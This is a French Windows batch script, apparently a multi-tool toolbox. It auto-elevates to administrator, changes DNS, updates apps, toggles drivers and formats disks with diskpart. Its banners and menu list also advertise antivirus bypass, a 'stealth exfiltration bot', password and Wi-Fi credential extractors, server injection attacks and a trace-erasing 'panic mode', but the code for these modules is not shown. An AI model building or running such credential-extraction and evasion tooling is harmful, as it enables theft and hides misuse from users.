@echo off
setlocal EnableExtensions EnableDelayedExpansion
chcp 65001 >nul

REM --- CONFIGURATION DU REPERTOIRE ---
set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
cd /d "%SCRIPT_DIR%"

REM --- DESACTIVATION DU MODE SELECTION (QUICKEDIT) POUR EVITER LES PAUSES ---
powershell -NoProfile -Command "$h = Get-Host; $r = $h.UI.RawUI; $m = $r.WindowTitle; $p = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'mscorlib' }; $t = $p.GetType('Microsoft.Win32.Win32Native'); $k = [IntPtr]::Zero; if ($t) { $s = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() }" >nul 2>&1

REM --- INITIALISATION DES COULEURS ANSI ---
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do set "ESC=%%b"
set "R=%ESC%[91m"
set "G=%ESC%[92m"
set "Y=%ESC%[93m"
set "B=%ESC%[94m"
set "W=%ESC%[97m"
set "N=%ESC%[0m"

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
fsutil dirty query %systemdrive% >nul 2>&1
if %errorlevel% neq 0 (
    cls
    echo.
    echo %R%    #################################################%N%
    echo %R%    #                                               #%N%
    echo %R%    #      [!] ACCES REFUSE : DROITS INSUFFISANTS   #%N%
    echo %R%    #                                               #%N%
    echo %R%    #   CE MODULE NECESSITE LES PRIVILEGES ADMIN    #%N%
    echo %R%    #                                               #%N%
    echo %R%    #################################################%N%
    echo.
    echo %Y%    [i] Relancement automatique en mode Administrateur...%N%
    echo.
    echo %B%    [ %G%■■■■■■■■■■■■■■■■■■■■■■■■ %B%]%N%
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM --- PARAMETRES DE LA FENETRE ---
title Boite a Scripts Windows - By ALEEXLEDEV (v3.5 GOLDEN EDITION)
mode con: cols=120 lines=60

:header
cls
echo %R%  ▄▄▄▄▄▄▄ ▄▄       ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄   ▄▄    ▄▄       ▄▄▄▄▄▄▄    ▄▄▄▄▄▄  ▄▄▄▄▄▄▄ ▄▄   ▄▄ %N%
echo %R% █       █  █     █       █       █  █ █  █  █  █     █       █  █      ██       █  █ █  █%N%
echo %R% █   ▄   █  █     █    ▄▄▄█    ▄▄▄█  █▄█  █  █  █     █    ▄▄▄█  █  ▄    █    ▄▄▄█  █▄█  █%N%
echo %W% █  █▄█  █  █     █   █▄▄▄█   █▄▄▄█       █  █  █     █   █▄▄▄   █ █ █   █   █▄▄▄█       █%N%
echo %W% █       █  █▄▄▄▄▄█    ▄▄▄█    ▄▄▄█       █  █  █▄▄▄▄▄█    ▄▄▄█  █ █▄█   █    ▄▄▄█       █%N%
echo %W% █   ▄   █       █   █▄▄▄█   █▄▄▄█   ▄   █  █       █   █▄▄▄   █       █   █▄▄▄█   ▄   █%N%
echo %W% █▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█  █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█  █▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█%N%
echo.
echo %Y%             ---===[  A  L  E  E  X     L  E     D  E  V  ]===---%N%
echo.
echo %B%    -------------------------------------------------------------------------------%N%
echo %W%    [+] VERSION : 3.5 GOLDEN EDITION            [+] BYPASS : ANTI-VIRUS LIVE%N%
echo %W%    [+] TARGET  : MULTI-NETWORK SCAN            [+] ACCESS : UNRESTRICTED%N%
echo %B%    -------------------------------------------------------------------------------%N%
echo.

REM --- DETECTION MODE SANS ECHEC ---
if defined SAFEBOOT_OPTION goto sys_safemode

REM --- INITIALISATION DES MODULES ---
echo %G%[ SYSTEM ]%N% Powering up framework...
set "CRED_FILE=%SCRIPT_DIR%\credentials.txt"
set "SMTP_USER="
set "SMTP_PASS="
set "EMAIL_TO="
if exist "%CRED_FILE%" (
    for /f "usebackq tokens=1,* delims==" %%A in ("%CRED_FILE%") do (
        if "%%A"=="SMTP_USER" set "SMTP_USER=%%B"
        if "%%A"=="SMTP_PASS" set "SMTP_PASS=%%B"
        if "%%A"=="EMAIL_TO"  set "EMAIL_TO=%%B"
    )
    echo %G%[ MODULE ]%N% Credentials base loaded.
) else (
    (echo SMTP_USER=& echo SMTP_PASS=& echo EMAIL_TO=) > "%CRED_FILE%"
)
echo %G%[ MODULE ]%N% Web-Exploit Database loaded.
echo %G%[ MODULE ]%N% Stealth Exfiltration Bot active.
echo.
echo %Y%[ i ] Initialisation terminée. Bienvenue, ALEEXLEDEV.%N%

REM --- CHARGEMENT DE LA BASE D'OUTILS ---

set "t[2]=---:DIAGNOSTIC"
set "t[3]=sys_diagnostic_menu:Menu de diagnostic~Regroupe 8 outils d'analyse (Systeme, Reseau, Sante...)"
set "t[4]=---:REPARATION"
set "t[5]=sys_rescue_menu:Outil Reparation Windows (Rescue)~Menu multi-outils (SFC, DISM, CHKDSK, Reset WinUpdate...)"
set "t[6]=sys_repair_icons:Reparation Cache Icones~Corrige les icones/miniatures corrompues"
set "t[7]=sys_winre:Mode Reparation (WinRE)~Demarrer dans l'environnement de reparation Windows"
set "t[8]=---:NETTOYAGE ET OPTIMISATION"
set "t[9]=sys_opti_menu:Menu de Nettoyage et Optimisation~Regroupe le nettoyage et l'optimisation"
set "t[10]=---:RESEAU"
set "t[11]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
set "t[12]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP)"
set "t[13]=net_cyber_menu:Scanner de failles et Pentest~Recherche de vulnerabilites Web et Reseau"
set "t[14]=---:DISQUE"
set "t[15]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
set "t[16]=---:APPLICATIONS"
set "t[17]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
set "t[18]=app_installer:Installateur d'applications~Installer des logiciels par categorie"
set "t[19]=---:COMPTES ET SECURITE"
set "t[20]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi)"
set "t[21]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle"
set "t[22]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
set "t[23]=sys_av_test:Test Antivirus (EICAR Safe)~Tester votre antivirus"
set "t[24]=cyber_privesc_audit:Audit de piratage local (PrivEsc)~Verifie l'elevation de privileges"
set "t[25]=cyber_gen_htaccess:Protection de serveur Web (.htaccess)~Genere un fichier blinde"
set "t[27]=---:EXTRACTION ET SAUVEGARDE"
set "t[28]=sys_export_menu:Menu des Extractions~Exporte cles, Wi-Fi et pilotes"
set "t[29]=---:PERSONNALISATION"
set "t[30]=context_menu:Menu contextuel Windows 11~Classic/Modern"
set "t[31]=sys_god_mode:Dossier God Mode~Raccourci ultime des parametres"
set "t[56]=sys_gaming_mode:Mode Gaming~Booster les perfs jeux"
set "t[57]=sys_shortcuts_bureau:Raccourcis Bureau 1-Clic~Redemarrer/Eteindre"
set "t[62]=---:MATERIEL"
set "t[63]=touch_screen_manager:Gestionnaire Ecran Tactile~Activer/Desactiver"
set "t[64]=sys_print_manager:Gestionnaire d'Imprimantes~Lister/Vider le Spooler"
set "t[65]=sys_power_plan:Gestionnaire Plan d'Alimentation~Equilibre/Performances"
set "t[66]=cyber_advanced_inject:Injections Avancees (SSTI/XXE/JWT)~Attaques serveur et API"
set "t[67]=cyber_recon_advanced:Reconnaissance Avancee~AXFR, crt.sh, WHOIS"
set "t[68]=cyber_pentest_report:Rapport Pentest HTML Unifie~Scan exhaustif"
set "t[73]=cyber_exposure_audit:Audit d'Exposition des Donnees~Recherche fichiers sensibles:HIDDEN"
set "t[74]=cyber_wifi_audit:Analyseur de Securite Wi-Fi~Detection Evil Twin:HIDDEN"
set "t[75]=cyber_cleanup_local:[!] PANIC MODE : Auto-Destruction~Nettoyage total:HIDDEN"
set "total_tools=75"



if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"

:menu_principal
cls
set "opts=[--- MES FAVORIS ---]"
set /a fav_idx=0

for /l %%I in (1,1,%total_tools%) do (
    if defined t[%%I] (
        for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
            if not "%%A"=="---" (
                set "is_fav=0"
                if exist "%SCRIPT_DIR%\favoris.txt" (
                    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
                        if "%%F"=="%%A" set "is_fav=1"
                    )
                )
                if "!is_fav!"=="1" (
                    set "opts=!opts!;(F) %%B"
                    set /a fav_idx+=1
                    set "main_target[!fav_idx!]=%%A"
                )
            )
        )
    )
)

if "!opts!"=="[--- MES FAVORIS ---]" (
    set "opts=!opts!;(Aucun favori - Appuyez sur [F] pour ajouter)"
    set /a fav_idx+=1
    set "main_target[!fav_idx!]=none"
)

set "opts=!opts!;[--- OUTILS AVANCES ---];Voir les outils systeme avances"
set "opts=!opts!;[!] PANIC MODE : Auto-Destruction~Efface les traces et le script"

call :DynamicMenu "BOITE A SCRIPTS WINDOWS - By ALEEXLEDEV" "!opts!"
set "main_choice=%errorlevel%"

if "!main_choice!"=="0" goto exit_script
if "!main_choice!"=="299" goto search_tools

if !main_choice! GEQ 200 (
    set /a toggle_idx=!main_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!main_target[%%X]!"
    if defined toggle_target if not "!toggle_target!"=="none" call :ToggleFav "!toggle_target!"
    goto menu_principal
)

set /a v_idx=fav_idx+1
set /a panic_idx=fav_idx+2

if "!main_choice!"=="!v_idx!" goto system_tools
if "!main_choice!"=="!panic_idx!" goto cyber_cleanup_local

set "target=!main_target[%main_choice%]!"
if defined target if not "!target!"=="none" goto !target!
goto menu_principal


REM ===================================================================
REM                    GESTIONNAIRE DNS CLOUDFLARE
REM ===================================================================
:dns_manager
set "opts=Affichage de la configuration actuelle;[--- CLOUDFLARE ---];DNS Cloudflare (1.1.1.1);[--- GOOGLE ---];DNS Google (8.8.8.8);[--- REINITIALISATION ---];Restauration des DNS par defaut (DHCP)"
call :DynamicMenu "GESTIONNAIRE DNS" "%opts%"
set "dns_choice=%errorlevel%"

if "%dns_choice%"=="1" goto show_dns_config
if "%dns_choice%"=="2" goto install_cloudflare_full
if "%dns_choice%"=="3" goto install_google_full
if "%dns_choice%"=="4" goto restore_dns
if "%dns_choice%"=="0" goto menu_principal
goto dns_manager

:install_cloudflare_full
cls
echo ================================================
echo     INSTALLATION DNS CLOUDFLARE (1.1.1.1)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Cloudflare IPv4...
netsh interface ip set dns "%interface%" static 1.1.1.1
netsh interface ip add dns "%interface%" 1.0.0.1 index=2

echo Configuration des DNS Cloudflare IPv6...
netsh interface ipv6 set dns "%interface%" static 2606:4700:4700::1111
netsh interface ipv6 add dns "%interface%" 2606:4700:4700::1001 index=2

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Cloudflare configures:
echo   IPv4 - Primaire: 1.1.1.1
echo   IPv4 - Secondaire: 1.0.0.1
echo   IPv6 - Primaire: 2606:4700:4700::1111
echo   IPv6 - Secondaire: 2606:4700:4700::1001
echo.
pause
goto dns_manager


:install_google_full
cls
echo ================================================
echo     INSTALLATION DNS GOOGLE (8.8.8.8)
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Sauvegarde de la configuration DNS actuelle...
if not exist "dns_backups" mkdir dns_backups
netsh interface ip show dns "%interface%" > "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
netsh interface ipv6 show dns "%interface%" >> "dns_backups\dns_backup_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%.txt"
echo Sauvegarde creee dans dns_backups
echo.

echo Configuration des DNS Google IPv4...
netsh interface ip set dns "%interface%" static 8.8.8.8 >nul 2>&1
netsh interface ip add dns "%interface%" 8.8.4.4 index=2 >nul 2>&1

echo Configuration des DNS Google IPv6...
netsh interface ipv6 set dns "%interface%" static 2001:4860:4860::8888 >nul 2>&1
netsh interface ipv6 add dns "%interface%" 2001:4860:4860::8844 index=2 >nul 2>&1

echo Vidage du cache DNS...
ipconfig /flushdns >nul

echo.
echo ================================================
echo     INSTALLATION TERMINEE AVEC SUCCES !
echo ================================================
echo.
echo DNS Google configures:
echo   IPv4 - Primaire: 8.8.8.8
echo   IPv4 - Secondaire: 8.8.4.4
echo   IPv6 - Primaire: 2001:4860:4860::8888
echo   IPv6 - Secondaire: 2001:4860:4860::8844
echo.
pause
goto dns_manager


:restore_dns
cls
echo ================================================
echo     RESTAURATION DNS PAR DEFAUT
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau detectee: %interface%
echo.

echo Restauration des DNS automatiques IPv4...
netsh interface ip set dns "%interface%" dhcp

echo Restauration des DNS automatiques IPv6...
netsh interface ipv6 set dns "%interface%" dhcp

echo Vidage du cache DNS...
ipconfig /flushdns

echo.
echo ================================================
echo     DNS RESTAURES AVEC SUCCES !
echo ================================================
echo.
pause
goto dns_manager

:show_dns_config
cls
echo ================================================
echo     CONFIGURATION DNS ACTUELLE
echo ================================================
echo.

call :get_interface
if "%interface%"=="" (
    echo ERREUR: Aucune interface reseau active trouvee
    pause
    goto dns_manager
)

echo Interface reseau: %interface%
echo.
echo Configuration DNS IPv4:
netsh interface ip show dns "%interface%"
echo.
echo Configuration DNS IPv6:
netsh interface ipv6 show dns "%interface%"
echo.
pause
goto dns_manager

:get_interface
set "interface="
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%b"=="Connecté" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%b"=="Connected" (
        set "interface=%%d"
        goto :interface_found
    )
)
for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
    if /i "%%c"=="Dédié" (
        set "interface=%%d"
        goto :interface_found
    )
    if /i "%%c"=="Dedicated" (
        set "interface=%%d"
        goto :interface_found
    )
)
:interface_found
if defined interface (
    set "interface=%interface: =%"
    set "interface=%interface:"=%"
)
goto :eof

REM ===================================================================
REM                   WINGET - Mises a jour des applications windows
REM ===================================================================
:winget_manager
set "opts=Mettre a jour une application (liste et choix);Mettre a jour toutes les applications"
call :DynamicMenu "WINGET - MISES A JOUR APPLICATIONS" "%opts%"
set "winget_choice=%errorlevel%"

if "%winget_choice%"=="1" goto update_single
if "%winget_choice%"=="2" goto update_all
if "%winget_choice%"=="0" goto menu_principal
goto winget_manager

:update_single
cls
echo ================================================
echo     LISTE DES APPLICATIONS A METTRE A JOUR
echo ================================================
echo.
winget update
echo.
echo Copiez l'ID de l'application que vous souhaitez mettre a jour.
echo.
set /p app_id=Entrez l'ID de l'application: 

if "%app_id%"=="" (
    echo Aucun ID saisi.
    pause
    goto winget_manager
)

echo.
echo Mise a jour de %app_id% en cours...
winget update --id %app_id% --accept-package-agreements --accept-source-agreements
echo.
echo Termine.
pause
goto winget_manager

:update_all
cls
echo ================================================
echo     MISE A JOUR DE TOUTES LES APPLICATIONS
echo ================================================
echo.
winget update --all --accept-package-agreements --accept-source-agreements
echo.
echo Toutes les mises a jour ont ete appliquees.
pause
goto winget_manager

REM ===================================================================
REM                    MENU CONTEXTUEL WINDOWS 11
REM ===================================================================
:context_menu
set "opts=Activer le menu contextuel classique;Restaurer le menu contextuel moderne"
call :DynamicMenu "MENU CONTEXTUEL WINDOWS 11" "%opts%"
set "ctx_choice=%errorlevel%"

if "%ctx_choice%"=="1" goto activate_classic
if "%ctx_choice%"=="2" goto restore_modern
if "%ctx_choice%"=="0" goto menu_principal
goto context_menu

:activate_classic
cls
echo.
echo Activation du menu contextuel classique...
echo.
reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve
echo Modification du registre terminee.
echo.
echo IMPORTANT : Un redemarrage de l'Explorateur Windows est necessaire.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel classique active avec succes !
) else (
    echo.
    echo Menu contextuel classique sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

:restore_modern
cls
echo.
echo Restauration du menu contextuel moderne...
echo.
reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f >nul 2>&1
echo Modification du registre terminee.
echo.
set /p restart_explorer=Redemarrer l'Explorateur maintenant ? (O/N): 
if /i "%restart_explorer%"=="O" (
    echo Redemarrage de l'Explorateur Windows...
    taskkill /f /im explorer.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    start explorer.exe
    echo.
    echo Menu contextuel moderne restaure avec succes !
) else (
    echo.
    echo Menu contextuel moderne sera actif apres le redemarrage de l'Explorateur.
)
echo.
pause
goto context_menu

REM ===================================================================
REM                    GESTIONNAIRE DE DISQUES - FORMATAGE AVEC DISKPART
REM ===================================================================
:disk_manager
cls
color 0A
echo.
echo =============================================================
echo                       DISKPART
echo =============================================================
echo.
echo Analyse des disques disponibles...
echo.

set "disk_opts="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | ForEach-Object { '{0}: {1} ({2:N0} GB)' -f $_.Number, $_.FriendlyName, ($_.Size/1GB) }"') do (
    if defined disk_opts (set "disk_opts=!disk_opts!;%%D") else (set "disk_opts=%%D")
)

if not defined disk_opts (
    echo [!] Aucun disque detecte.
    pause
    goto menu_principal
)

call :DynamicMenu "CHOISISSEZ LE DISQUE A FORMATER" "%disk_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto menu_principal

rem Recuperer le numero du disque a partir du choix
set /a idx=1
set "disk_num="
for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
    if !idx! equ %res% set "disk_num=%%D"
    set /a idx+=1
)

if not defined disk_num goto disk_manager

:disk_format_choice
set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
set "format_choice=%errorlevel%"

if "%format_choice%"=="0" goto menu_principal
if "%format_choice%"=="1" set fs_type=NTFS
if "%format_choice%"=="2" set fs_type=FAT32
if "%format_choice%"=="3" set fs_type=exFAT
if "%format_choice%"=="4" set fs_type=ReFS

if not defined fs_type goto disk_format_choice

cls
echo.
echo =============================================================
echo                       CONFIRMATION
echo =============================================================
echo.
echo Vous allez formater le DISQUE %disk_num%
echo Format selectionne : %fs_type%
echo.
echo ATTENTION: TOUTES LES DONNEES SERONT DEFINITIVEMENT EFFACEES !
echo.
echo Tapez 'OUI' en majuscules pour confirmer (ou autre pour annuler) :
set /p confirmation=Confirmation: 

if not "%confirmation%"=="OUI" (
    echo.
    echo Operation annulee par l'utilisateur.
    timeout /t 2 >nul
    goto disk_manager
)

echo.
echo =============================================================
echo Preparation du formatage...
echo =============================================================
echo.

set script_temp=%temp%\diskpart_script.txt

(
    echo select disk %disk_num%
    echo clean
    echo create partition primary
    echo format fs=%fs_type% quick
    echo assign
    echo exit
) > "%script_temp%"

echo Execution des commandes diskpart...
echo.
diskpart /s "%script_temp%"

set result=%errorLevel%

del "%script_temp%" >nul 2>&1

echo.
echo =============================================================
if %result% equ 0 (
    echo.
    echo Formatage termine avec succes !
    echo.
    echo Le disque %disk_num% a ete :
    echo   - Nettoye completement
    echo   - Partitionne en partition primaire
    echo   - Formate en %fs_type%
    echo   - Une lettre de lecteur lui a ete assignee
    echo.
) else (
    echo.
    echo Une erreur s'est produite pendant le formatage.
    echo Verifiez que le disque existe et n'est pas protege.
    echo.
)
echo =============================================================
echo.

set /p disk_choice=Voulez-vous formater un autre disque ? (O/N): 
if /i "%disk_choice%"=="O" goto disk_manager
goto menu_principal

REM ===================================================================
REM                    GESTIONNAIRE D'ECRAN TACTILE
REM ===================================================================
:touch_screen_manager
set "opts=Redemarrer le pilote tactile;Desactiver le pilote tactile;Activer le pilote tactile"
call :DynamicMenu "GESTION ECRAN TACTILE" "%opts%"
set "touch_choice=%errorlevel%"

if "%touch_choice%"=="1" goto touch_restart
if "%touch_choice%"=="2" goto touch_disable
if "%touch_choice%"=="3" goto touch_enable
if "%touch_choice%"=="0" goto system_tools
goto touch_screen_manager

:touch_restart
cls
echo.
echo === Redemarrage du pilote d'ecran tactile ===
echo.

echo Redemarrage du service TabletInputService...
net stop TabletInputService >nul 2>&1
timeout /t 2 /nobreak >nul
net start TabletInputService >nul 2>&1

echo Redemarrage du service HidServ...
net stop HidServ >nul 2>&1
timeout /t 2 /nobreak >nul
net start HidServ >nul 2>&1

echo.
echo Desactivation/Reactivation du peripherique tactile via PowerShell...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false }; Start-Sleep -Seconds 2; foreach ($device in $touchDevices) { Write-Host 'Reactivation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo Redemarrage du processus dwm.exe (Desktop Window Manager)...
taskkill /f /im dwm.exe >nul 2>&1
timeout /t 1 /nobreak >nul

echo.
echo === Redemarrage termine ===
echo Testez votre ecran tactile maintenant.
echo.
pause
goto touch_screen_manager

:touch_disable
cls
echo.
echo === Desactivation du pilote tactile ===
echo.

echo Arret du service TabletInputService...
net stop TabletInputService >nul 2>&1

echo Desactivation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Desactivation:' $device.FriendlyName; Disable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo.
echo === Pilote tactile desactive ===
echo Le tactile restera desactive jusqu'a reactivation manuelle.
echo.
pause
goto touch_screen_manager

:touch_enable
cls
echo.
echo === Activation du pilote tactile ===
echo.

echo Activation du peripherique tactile...
powershell -Command "& { $touchDevices = Get-PnpDevice | Where-Object { ($_.FriendlyName -like '*HID*' -and ($_.FriendlyName -like '*tactile*' -or $_.FriendlyName -like '*touch*')) -or ($_.Class -eq 'HIDClass' -and $_.FriendlyName -like '*ecran*') }; if ($touchDevices) { foreach ($device in $touchDevices) { Write-Host 'Activation:' $device.FriendlyName; Enable-PnpDevice -InstanceId $device.InstanceId -Confirm:$false } } else { Write-Host 'Aucun peripherique tactile trouve' } }"

echo Demarrage du service TabletInputService...
net start TabletInputService >nul 2>&1

echo.
echo === Pilote tactile active ===
echo.
pause
goto touch_screen_manager

REM ===================================================================
REM                    OUTILS SYSTEME AVANCES
REM ===================================================================
:system_tools
cls
set "opts="
set /a s_idx=0
for /l %%I in (1,1,%total_tools%) do (
    set "_entry=!t[%%I]!"
    if defined _entry (
        REM Extrait le label (avant le premier :)
        for /f "tokens=1 delims=:" %%A in ("!_entry!") do set "_lbl=%%A"
        REM Extrait le nom (entre le premier : et le ~)
        set "_rest=!_entry!"
        call set "_rest=%%_rest:*!_lbl!:=%%"
        for /f "tokens=1 delims=~" %%N in ("!_rest!") do set "_name=%%N"
        REM Detecte HIDDEN (fin de ligne)
        set "_hidden=0"
        if "!_entry:~-7!"==":HIDDEN" set "_hidden=1"
        REM Detecte separateur ---
        if "!_lbl!"=="---" (
            set "opts=!opts!;[--- !_name! ---]"
        ) else if "!_hidden!"=="0" (
            set "is_fav=0"
            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="!_lbl!" set "is_fav=1")
            if "!is_fav!"=="1" (
                set "opts=!opts!;(F) !_name!"
            ) else (
                set "opts=!opts!;!_name!"
            )
            set /a s_idx+=1
            set "sys_target[!s_idx!]=!_lbl!"
        )
    )
)

set "opts=!opts:~1!"

call :DynamicMenu "OUTILS SYSTEME AVANCES" "!opts!"
set "sys_choice=%errorlevel%"

if "!sys_choice!"=="0" goto menu_principal
if "!sys_choice!"=="299" goto search_tools

if !sys_choice! GEQ 200 (
    set /a toggle_idx=!sys_choice!-200
    for %%X in (!toggle_idx!) do set "toggle_target=!sys_target[%%X]!"
    call :ToggleFav "!toggle_target!"
    goto system_tools
)

set "target=!sys_target[%sys_choice%]!"
if defined target goto !target!
goto system_tools
REM ===================================================================
:search_tools
cls
set "search_lbl="
REM Construire les donnees de recherche via variable d'environnement (evite ecriture %TEMP% bloquee par Defender)
set "ALEEX_TOOLS_DATA="
for /l %%I in (1,1,%total_tools%) do (
    set "_e=!t[%%I]!"
    if defined _e (
        if not "!_e:~0,3!"=="---" (
            set "ALEEX_TOOLS_DATA=!ALEEX_TOOLS_DATA!|!_e!"
        )
    )
)
set "ALEEX_TOOLS_DATA=!ALEEX_TOOLS_DATA:~1!"
for /f "usebackq tokens=*" %%L in (`powershell -NoProfile -ExecutionPolicy Bypass -Command "$raw=$env:ALEEX_TOOLS_DATA;$all=@();if($raw){foreach($entry in ($raw-split'\|')){$p=$entry-split'~',2;$ls=$p[0];$d=if($p.Count-gt 1){($p[1]-replace':HIDDEN$','').Trim()}else{'');$c2=$ls.IndexOf(':');if($c2-ge 0){$lb=$ls.Substring(0,$c2).Trim();$nm=$ls.Substring($c2+1).Trim();if($lb-and $lb-ne'---'){$all+=@{N=$nm;D=$d;L=$lb}}}}};$list=[array]($all|Sort-Object{$_['N']});$q='';$s=0;function Dsp{param($q,$r,$s);clear-host;Write-Host'  ============================================'-f Cyan;Write-Host'   [S] RECHERCHE D OUTILS'-f White;Write-Host'  ============================================'-f Cyan;Write-Host'';Write-Host('  Recherche : '+$q+'_')-f Yellow;Write-Host'';if($r.Count-gt 0){Write-Host('  '+$r.Count+' outil(s) trouve(s)')-f Cyan;Write-Host'';for($i=0;$i-lt[math]::Min($r.Count,30);$i++){if($i-eq $s){Write-Host('  >> ['+($i+1)+'] '+$r[$i]['N'])-NoNewline-f Black-b White;Write-Host(' - '+$r[$i]['D'])-f Yellow-b White}else{Write-Host('     ['+($i+1)+'] '+$r[$i]['N'])-NoNewline-f Gray;Write-Host(' - '+$r[$i]['D'])-f DarkGray}}}else{if($q.Length-gt 0){Write-Host'  Aucun resultat.'-f DarkGray}else{Write-Host'  Tapez pour filtrer les outils...'-f DarkGray}};Write-Host'';Write-Host'  --------------------------------------------'-f Cyan;Write-Host'  [LETTRES]Taper [FLECHES]Nav [ENTREE]Lancer [BACK]Effacer [ECHAP]Retour'-f DarkGray};while($true){$r2=if($q.Trim()){[array]($list|Where-Object{$_['N']-match[regex]::Escape($q)-or$_['D']-match[regex]::Escape($q)})}else{@()};if($r2.Count-gt 0-and $s-ge $r2.Count){$s=$r2.Count-1};Dsp $q $r2 $s;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v-eq 27){clear-host;break}elseif($v-eq 8-and $q.Length-gt 0){$q=$q.Substring(0,$q.Length-1);$s=0}elseif($v-eq 38-and $r2.Count-gt 0){$s--;if($s-lt 0){$s=$r2.Count-1}}elseif($v-eq 40-and $r2.Count-gt 0){$s++;if($s-ge $r2.Count){$s=0}}elseif($v-eq 13-and $r2.Count-gt 0){clear-host;Write-Output $r2[$s]['L'];break}elseif([string]$k.Character-match'^[1-9]$'){$ci=[int][string]$k.Character-1;if($ci-lt $r2.Count){clear-host;Write-Output $r2[$ci]['L'];break}}elseif($k.Character-ge' '-and $k.Character-le'~'){$q+=$k.Character;$s=0}}" 2^>nul`) do set "search_lbl=%%L"
REM Valider que search_lbl est un label valide (lettres/chiffres/underscore seulement)
if defined search_lbl (
    echo !search_lbl! | findstr /R /C:"^[a-zA-Z_][a-zA-Z0-9_]*$" >nul 2>&1
    if !errorlevel!==0 goto !search_lbl!
)
goto menu_principal



REM ===================================================================
